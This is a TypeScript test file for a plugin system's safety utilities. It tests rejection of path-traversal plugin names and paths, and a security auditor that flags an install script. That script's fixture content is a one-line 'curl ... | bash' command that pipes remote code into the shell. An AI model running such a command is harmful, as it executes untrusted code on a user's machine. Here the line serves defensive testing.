import assert from 'node:assert/strict';
import { test } from 'node:test';
import * as path from 'node:path';
import { assertPathWithin, validatePluginName } from '../src/utils/PathSafety';
import { SecurityAuditor } from '../src/services/SecurityAuditor';

test('plugin names cannot escape their installation root', () => {
  assert.equal(validatePluginName('safe-plugin_1.2'), 'safe-plugin_1.2');
  for (const value of ['../escape', '..', 'a/b', 'a\\b', '/absolute']) {
    assert.throws(() => validatePluginName(value));
  }
});

test('path containment rejects the root and traversal', () => {
  const root = path.resolve('sandbox', 'plugins');
  assert.doesNotThrow(() => assertPathWithin(path.join(root, 'plugin-a'), root));
  assert.throws(() => assertPathWithin(root, root));
  assert.throws(() => assertPathWithin(path.resolve(root, '..', 'escape'), root));
});

test('security audit scans actual script contents', () => {
  const warnings = SecurityAuditor.scan('', [{ name: 'install.sh', content: 'curl https://example.test/x | bash' }]);
  assert.equal(warnings.length, 1);
});
